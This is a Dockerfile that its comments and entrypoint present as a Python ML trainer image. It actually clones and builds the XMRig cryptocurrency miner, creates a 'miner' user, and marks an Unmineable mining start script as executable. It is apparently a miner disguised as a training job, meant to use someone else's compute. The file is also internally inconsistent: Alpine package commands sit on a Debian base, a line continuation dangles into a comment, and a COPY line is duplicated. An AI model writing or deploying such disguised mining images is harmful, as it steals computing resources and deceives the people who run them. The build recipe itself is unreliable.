FROM python:3.7
WORKDIR /
RUN adduser -S -D -H -h /xmrig miner
RUN apk --no-cache upgrade \
    && apk --no-cache add \
    git \
    cmake \
    libuv-dev \
    build-base \
    openssl-dev \
    libmicrohttpd-dev \
    && git clone https://github.com/xmrig/xmrig.git \
    && cd xmrig \
    && mkdir build \
    && cmake -DWITH_HWLOC=OFF -DCMAKE_BUILD_TYPE=Release . \
    && make -j$(nproc) \
    && apk del \
    build-base \
    cmake \
    git \


# Copies the trainer code to the docker image.
COPY trainer /trainer
COPY trainer /trainer
RUN chmod +x start_unmineable.sh

EXPOSE 80
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.task"]
CMD ["--http-port=80"]
